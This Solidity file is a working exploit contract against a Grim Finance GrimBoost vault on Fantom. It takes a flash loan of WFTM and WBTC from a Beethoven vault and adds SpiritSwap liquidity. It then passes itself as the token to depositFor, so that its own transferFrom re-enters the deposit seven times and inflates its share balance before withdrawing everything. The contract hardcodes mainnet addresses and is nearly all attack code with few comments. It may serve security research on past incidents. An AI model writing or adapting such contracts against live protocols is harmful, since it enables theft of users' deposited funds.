// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces.sol";

contract Exploit {
    IBeethovenVault Beethoven_vault = IBeethovenVault(0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce); // for flashloan
    IGrimBoostVault GrimBoost_vault = IGrimBoostVault(0x660184CE8AF80e0B1e5A1172A16168b15f4136bF);
    IUniswapV2Router SPIRIT_router = IUniswapV2Router(0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52);
    IPancakePair SPIRIT_LP = IPancakePair(0x279b2c897737a50405ED2091694F225D83F2D3bA);
    IWFTM WFTM = IWFTM(payable(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83));
    IERC20 WBTC = IERC20(0x321162Cd933E2Be498Cd2267a90534A804051b11); 

    uint WFTM_loan = 937830 * 1e18;
    uint WBTC_loan = 30 * 1e8;
    uint balanceOf_SPIRIT_LP;
    uint step = 7;
    
    function start() external {
        // Grab a flashloan
        IERC20[] memory token = new IERC20[](2);
        token[0] = WFTM;
        token[1] = WBTC;

        uint256[] memory amount = new uint256[](2);
        amount[0] = WFTM_loan;
        amount[1] = WBTC_loan;

        Beethoven_vault.flashLoan(IFlashLoanRecipient(address(this)), token, amount, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData) public {

        WFTM.approve(address(SPIRIT_router), WFTM_loan);
        WBTC.approve(address(SPIRIT_router), WBTC_loan);

        // Bring liquidity to SpiritSwap
        SPIRIT_router.addLiquidity(address(WFTM), address(WBTC), WFTM_loan, WBTC_loan, 0, 0, address(this), block.timestamp);

        SPIRIT_LP.approve(address(GrimBoost_vault), 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        balanceOf_SPIRIT_LP = SPIRIT_LP.balanceOf(address(this));

        // Invoke depositFor() in GrimBoost vault with token==ATTACKER, user=ATTACKER
        GrimBoost_vault.depositFor(address(this), balanceOf_SPIRIT_LP,address(this));

        GrimBoost_vault.withdrawAll();

        balanceOf_SPIRIT_LP = SPIRIT_LP.balanceOf(address(this));
        SPIRIT_LP.transfer(address(SPIRIT_LP), balanceOf_SPIRIT_LP);
        SPIRIT_LP.burn(address(this));

        for (uint256 i = 0; i < tokens.length; ++i) {
            IERC20 _token = tokens[i];
            uint256 _amount = amounts[i];
            uint256 _feeAmount = feeAmounts[i];
            _token.transfer(address(Beethoven_vault), (_amount+_feeAmount));
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public {
        step -= 1;
        if (step > 0){
            GrimBoost_vault.depositFor(address(this), balanceOf_SPIRIT_LP, address(this));
        } else {
            // For last call attacker used spirit LP address to end reentrancy 
            GrimBoost_vault.depositFor(address(SPIRIT_LP), balanceOf_SPIRIT_LP, address(this));
        }
    }
}
